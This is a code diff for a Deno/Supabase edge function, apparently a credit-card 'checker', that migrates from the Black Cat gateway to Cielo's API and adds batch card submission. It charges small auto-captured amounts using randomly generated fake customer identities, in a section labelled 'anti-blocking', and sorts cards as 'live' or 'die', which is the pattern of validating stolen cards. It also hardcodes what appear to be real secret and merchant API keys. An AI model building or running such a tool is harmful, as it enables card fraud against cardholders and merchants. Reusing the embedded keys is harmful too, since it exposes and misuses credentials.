@@ -1,6 +1,5 @@
 import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
 import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';
-import { encode } from 'https://deno.land/std@0.168.0/encoding/base64.ts';
 
 const corsHeaders = {
     'Access-Control-Allow-Origin': '*',
@@ -13,19 +12,34 @@ interface TestCardRequest {
     expMonth: string;
     expYear: string;
     cvv: string;
-    gatewayUrl?: string; // Mantido para compatibilidade, mas ignorado ou usado como log
+    gatewayUrl?: string;
     processingOrder: number;
     amount?: number;
     proxyUrl?: string;
     token?: string;
 }
 
+interface BatchTestCardRequest {
+    sessionId: string;
+    cards: Array<{
+        cardNumber: string;
+        expMonth: string;
+        expYear: string;
+        cvv: string;
+        processingOrder: number;
+        amount?: number;
+    }>;
+    gatewayUrl?: string;
+    proxyUrl?: string;
+}
+
 // ========================================
-// CONFIGURAÇÃO BLACK CAT (Chaves fornecidas)
+// CONFIGURAÇÃO CIELO (API E-commerce)
 // ========================================
-const BLACKCAT_PUBLIC_KEY = Deno.env.get('BLACKCAT_PUBLIC_KEY') || 'pk_eSrGQ8gm5ZFtewLt9uXOLV5ceauzPrApaxRT3h9Pkz5zV8rt';
-const BLACKCAT_SECRET_KEY = Deno.env.get('BLACKCAT_SECRET_KEY') || 'sk_5eLwUvhPkpQryeuH-YPpEyAy_-UMNGRJRvXctsaLkot0iA6L';
-const BLACKCAT_API_URL = 'https://api.blackcatpagamentos.com/v1';
+const CIELO_MERCHANT_ID = Deno.env.get('CIELO_MERCHANT_ID') || 'c8bb2f93-34b2-4bc8-a382-be44300aa20e';
+const CIELO_MERCHANT_KEY = Deno.env.get('CIELO_MERCHANT_KEY') || 'QwjkObfkerFPwgsnHDhc2v5atcCWU4QdUuZGoSWE';
+const CIELO_API_URL = 'https://apisandbox.cieloecommerce.cielo.com.br/1/sales'; // Sandbox para testes
+// Produção: https://api.cieloecommerce.cielo.com.br/1/sales
 
 // ========================================
 // GERAÇÃO DE DADOS (Anti-Bloqueio)
@@ -71,120 +85,134 @@ function generateCustomerData() {
     };
 }
 
-// ... (Customer data generation above)
 
-const productNames = ['Curso de Marketing Digital', 'E-book Receitas', 'Mentoria Online', 'Assinatura Premium', 'Kit Ferramentas', 'Workshop Exclusivo', 'Acesso Vitalício', 'Pacote de Design'];
 
-function generateProductData(amountInCents: number) {
-    const productName = productNames[Math.floor(Math.random() * productNames.length)];
-    return {
-        name: productName,
-        unitPrice: amountInCents,
-        quantity: 1,
-        tangible: false
-    };
-}
-
-// ...
-
-async function processBlackCatSale(cardData: TestCardRequest) {
-    console.log('🐈 Processing Black Cat Payment...');
+async function processCieloSale(cardData: TestCardRequest) {
+    console.log('💳 Processing Cielo Payment...');
 
     const customerData = generateCustomerData();
-    // Default amount 100 cents (R$ 1.00) if not provided. Black Cat expects integer cents.
-    // If cardData.amount is regular float (e.g. 1.00), multiply by 100.
-    // Assuming cardData.amount coming from frontend might be float 1.50 etc.
+    // Cielo expects amount in cents (integer)
     const amountInCents = cardData.amount ? Math.round(cardData.amount * 100) : 100;
 
-    const productData = generateProductData(amountInCents);
-
-    const authHeader = `Basic ${encode(`${BLACKCAT_PUBLIC_KEY}:${BLACKCAT_SECRET_KEY}`)}`;
+    // Formatar ano completo (Cielo espera YYYY)
+    const fullYear = cardData.expYear.length === 2 ? `20${cardData.expYear}` : cardData.expYear;
 
     const payload = {
-        amount: amountInCents,
-        paymentMethod: "credit_card",
-        installments: 1,
-        card: {
-            holderName: customerData.name.toUpperCase(),
-            number: cardData.cardNumber.replace(/\D/g, ''),
-            expirationMonth: parseInt(cardData.expMonth),
-            expirationYear: parseInt(cardData.expYear.slice(-2)),
-            cvv: cardData.cvv
-        },
-        customer: {
-            name: customerData.name,
-            email: customerData.email,
-            documentNumber: customerData.documentNumber,
-            phoneNumber: customerData.phoneNumber,
-            address: {
-                street: customerData.address.street,
-                number: customerData.address.number,
-                neighborhood: customerData.address.neighborhood,
-                city: customerData.address.city,
-                state: customerData.address.state,
-                zipCode: customerData.address.zipCode
+        MerchantOrderId: `TEST-${Date.now()}`,
+        Customer: {
+            Name: customerData.name,
+            Email: customerData.email,
+            Identity: customerData.documentNumber,
+            IdentityType: 'CPF',
+            Address: {
+                Street: customerData.address.street,
+                Number: customerData.address.number.toString(),
+                Complement: '',
+                ZipCode: customerData.address.zipCode,
+                City: customerData.address.city,
+                State: customerData.address.state,
+                Country: 'BRA'
             }
         },
-        items: [
-            {
-                title: productData.name,
-                unitPrice: productData.unitPrice,
-                quantity: productData.quantity,
-                tangible: productData.tangible
+        Payment: {
+            Type: 'CreditCard',
+            Amount: amountInCents,
+            Installments: 1,
+            Capture: true, // Captura automática
+            SoftDescriptor: 'TestadorZaga',
+            CreditCard: {
+                CardNumber: cardData.cardNumber.replace(/\D/g, ''),
+                Holder: customerData.name.toUpperCase(),
+                ExpirationDate: `${cardData.expMonth}/${fullYear}`,
+                SecurityCode: cardData.cvv,
+                Brand: detectCardBrand(cardData.cardNumber)
             }
-        ],
-        description: `Pagamento de ${productData.name}`
+        }
     };
 
-    console.log('📤 Payload:', JSON.stringify(payload, null, 2));
+    console.log('📤 Cielo Payload:', JSON.stringify(payload, null, 2));
 
     try {
-        const response = await fetch(`${BLACKCAT_API_URL}/transactions`, {
+        const response = await fetch(CIELO_API_URL, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'Authorization': authHeader
+                'MerchantId': CIELO_MERCHANT_ID,
+                'MerchantKey': CIELO_MERCHANT_KEY
             },
             body: JSON.stringify(payload)
         });
 
         const data = await response.json();
-        console.log(`📥 API Response [${response.status}]:`, JSON.stringify(data));
+        console.log(`📥 Cielo Response [${response.status}]:`, JSON.stringify(data));
 
         let status = 'die';
-        // Mapeamento de resposta Black Cat
-        // Sucesso geralmente é 200/201. Status dentro do body: "paid", "authorized" etc.
-        // Baseado em gateways similares (Pagar.me/Mundipagg/etc), e doc lida:
-        // Ajustar conforme payload real retornado.
-        if (response.ok) {
-            const txStatus = data.status?.toLowerCase();
-            if (['paid', 'authorized', 'captured'].includes(txStatus)) {
-                status = 'live';
-            } else if (txStatus === 'refused' || txStatus === 'failed') {
-                status = 'die';
-            } else {
-                // Pode ser pending ou processing, tratamos como unknown ou die no contexto de checker?
-                // Checkers geralmente querem saber se passou na hora.
-                status = 'unknown';
+        let message = 'Transaction failed';
+
+        // Mapeamento de status Cielo
+        // Referência: https://developercielo.github.io/manual/cielo-ecommerce
+        if (response.ok && data.Payment) {
+            const paymentStatus = data.Payment.Status;
+            const returnCode = data.Payment.ReturnCode;
+            const returnMessage = data.Payment.ReturnMessage || '';
+
+            switch (paymentStatus) {
+                case 0: // NotFinished
+                    status = 'unknown';
+                    message = 'Transação não finalizada';
+                    break;
+                case 1: // Authorized
+                    status = 'live';
+                    message = `Aprovado: ${returnMessage}`;
+                    break;
+                case 2: // PaymentConfirmed - Capturado
+                    status = 'live';
+                    message = `Capturado: ${returnMessage}`;
+                    break;
+                case 3: // Denied
+                    status = 'die';
+                    message = `Negado: ${returnMessage} (${returnCode})`;
+                    break;
+                case 10: // Voided
+                    status = 'die';
+                    message = 'Cancelado';
+                    break;
+                case 11: // Refunded
+                    status = 'die';
+                    message = 'Estornado';
+                    break;
+                case 12: // Pending
+                    status = 'unknown';
+                    message = 'Aguardando retorno';
+                    break;
+                case 13: // Aborted
+                    status = 'die';
+                    message = 'Cancelado por falha';
+                    break;
+                case 20: // Scheduled
+                    status = 'unknown';
+                    message = 'Agendado';
+                    break;
+                default:
+                    status = 'unknown';
+                    message = `Status desconhecido: ${paymentStatus}`;
             }
         } else {
-            // Erro na requisição (400, 401, etc)
-            if (data.message && data.message.toLowerCase().includes('recusado')) {
-                status = 'die';
-            } else {
-                status = 'die'; // Default p/ erro assumimos falha
-            }
+            // Erro na requisição
+            const errorMessage = data[0]?.Message || data.Message || 'Erro na comunicação com Cielo';
+            status = 'die';
+            message = errorMessage;
         }
 
         return {
             success: true,
             status: status,
-            message: data.message || data.status || 'Transaction processed',
+            message: message,
             raw: data
         };
 
     } catch (error: any) {
-        console.error('❌ Black Cat Request Error:', error.message);
+        console.error('❌ Cielo Request Error:', error.message);
         return {
             success: false,
             status: 'error',
@@ -194,6 +222,33 @@ async function processBlackCatSale(cardData: TestCardRequest) {
     }
 }
 
+// Helper function para detectar bandeira do cartão
+function detectCardBrand(cardNumber: string): string {
+    const cleanNumber = cardNumber.replace(/\D/g, '');
+    const firstDigit = cleanNumber[0];
+    const firstTwo = cleanNumber.substring(0, 2);
+    const firstFour = cleanNumber.substring(0, 4);
+
+    if (firstDigit === '4') return 'Visa';
+    if (firstTwo >= '51' && firstTwo <= '55') return 'Master';
+    if (firstTwo === '34' || firstTwo === '37') return 'Amex';
+    if (firstFour === '6011' || firstTwo === '65') return 'Discover';
+    if (firstFour >= '3528' && firstFour <= '3589') return 'JCB';
+    if (firstTwo === '36' || firstTwo === '38') return 'Diners';
+    if (firstFour === '6062') return 'Hipercard';
+    if (firstTwo === '60' || firstFour === '6363') return 'Elo';
+
+    return 'Visa'; // Default
+}
+
+// ========================================
+// SUPABASE CLIENT - Inicializado uma vez, reutilizado
+// ========================================
+const supabaseClient = createClient(
+    Deno.env.get('SUPABASE_URL') ?? '',
+    Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
+);
+
 // ========================================
 // MAIN HANDLER
 // ========================================
@@ -202,13 +257,19 @@ serve(async (req) => {
     if (req.method === 'OPTIONS') return new Response('ok', { headers: corsHeaders });
 
     try {
-        const supabaseClient = createClient(
-            Deno.env.get('SUPABASE_URL') ?? '',
-            Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
-        );
+        // Reutiliza o cliente Supabase já inicializado
 
-        const requestData: TestCardRequest = await req.json();
-        const { sessionId, cardNumber, expMonth, expYear, cvv, processingOrder, amount } = requestData;
+        const requestData: TestCardRequest | BatchTestCardRequest = await req.json();
+
+        // Detecta se é batch ou single request
+        const isBatchRequest = 'cards' in requestData;
+
+        if (isBatchRequest) {
+            return await processBatchCards(requestData as BatchTestCardRequest, supabaseClient);
+        }
+
+        // Single card processing (mantém compatibilidade)
+        const { sessionId, cardNumber, expMonth, expYear, cvv, processingOrder, amount } = requestData as TestCardRequest;
 
         if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv) {
             return new Response(JSON.stringify({ error: 'Missing fields' }), { status: 400, headers: corsHeaders });
@@ -216,9 +277,9 @@ serve(async (req) => {
 
         const startTime = Date.now();
 
-        // FORCED to Black Cat for migration
-        const gatewayUsed = 'BLACK_CAT';
-        const result = await processBlackCatSale(requestData);
+        // Using Cielo E-commerce API
+        const gatewayUsed = 'CIELO';
+        const result = await processCieloSale(requestData);
 
         // Normalize response for frontend
         const finalResult = {
